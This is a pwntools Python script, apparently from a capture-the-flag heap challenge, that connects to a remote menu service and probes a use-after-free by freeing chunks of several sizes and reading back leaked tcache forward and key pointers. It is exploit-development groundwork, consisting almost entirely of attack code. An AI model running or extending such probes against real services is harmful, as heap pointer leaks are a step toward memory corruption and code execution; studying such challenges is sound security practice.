#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def recvmenu(p):
    return p.recvuntil(b'> ')

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def edit(p, idx, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)  # consume trailing newline
    return data

p = connect()
banner = recvmenu(p)
print("=== BANNER ===")
print(banner.decode(errors='replace'))

# Test: Create spell with different sizes and check UAF
for test_size in [0x80, 0x100, 0x200, 0x10, 0x20]:
    print(f"\n=== Test with size 0x{test_size:x} ===")
    idx = 0
    create(p, idx, test_size, b'X' * min(test_size - 1, 0x7f) + b'\n')
    banish(p, idx)
    data = recite(p, idx, test_size)
    if len(data) >= 16:
        fd = u64(data[0:8])
        key = u64(data[8:16])
        print(f"  fd  = {hex(fd)}")
        print(f"  key = {hex(key)}")
        if fd == 0:
            print("  -> fd is NULL (tcache was empty)")
        else:
            print(f"  -> fd is non-NULL, points to {hex(fd)}")
    else:
        print(f"  data: {data.hex()}")

p.sendline(b'0')
p.close()
